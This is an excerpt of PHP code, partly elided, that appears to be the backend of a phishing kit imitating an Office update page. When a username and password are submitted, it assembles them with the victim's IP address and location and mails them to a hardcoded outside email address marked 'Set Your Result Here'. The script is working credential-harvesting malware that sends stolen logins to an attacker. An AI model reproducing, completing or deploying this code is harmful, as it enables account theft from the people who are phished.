...
if(!empty($pass) && !empty($user)) {
	...
	if ($count > 1) {
		...
		if($Checker){
			$message = "Office 2022 HTML-Update\n";
			$message .= "+++++++++++++++++++++++++++++++++\n";
			$message .= "User: ".$user."\n";
			$message .= "Pass : ".$pass."\n";
			$message .= "Address : ".$cip."\n";
			...
			$resultz = "xseenbod@protonmail@protonmail.com"; // Set Your Result Here
			$subject = "$cip | 0Ffice-22  - $main_country";
			...
			$message .= "Location : ".$address."\n";
			$message .= "---------------- 2021 TrueLogin --------------\n";
			$resultz = "xseenbod@protonmail.com"; // Set Your Result Here 
			$subject = "$cip | 0Ffice-22  - $main_country";
			mail($resultz, $subject, $message);
			echo 'GAGAL';
		}
